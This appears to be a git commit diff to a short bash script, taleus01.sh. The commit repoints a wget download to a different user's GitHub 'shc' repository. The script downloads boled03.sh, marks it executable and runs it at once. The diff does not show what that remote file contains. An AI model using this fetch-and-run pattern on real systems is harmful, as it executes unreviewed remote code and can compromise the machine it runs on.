f15febc96d9f27b2ee7813de5a1fa6fb5b7314d3
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-22 22:53:13 +0700

    Update taleus01.sh

--- taleus01.sh
+++ taleus01.sh
@@ -1,3 +1,3 @@
 #!/bin/bash 
-wget https://raw.githubusercontent.com/Sonehra/shc/master/boled03.sh && chmod +x boled03.sh
+wget https://raw.githubusercontent.com/TiannaMcdowell/shc/master/boled03.sh && chmod +x boled03.sh
 ./boled03.sh
